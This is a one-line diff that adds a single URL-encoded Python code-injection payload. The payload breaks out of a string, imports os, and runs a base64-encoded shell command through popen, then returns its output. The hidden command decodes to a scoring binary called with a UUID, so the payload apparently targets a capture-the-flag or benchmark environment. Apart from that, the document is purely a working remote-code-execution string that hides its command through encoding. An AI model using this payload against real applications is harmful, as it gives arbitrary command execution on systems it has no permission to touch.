@@ -1,0 +1,1 @@
+"%2bstr(__import__('os').popen(__import__('base64').b64decode('L3Vzci9sb2NhbC9iaW4vc2NvcmUgM2NmNTYwOGItMmJkYy00YjYyLWJkNGYtMzAyZDA5Yjk3Nzc1')).read())%2b" 
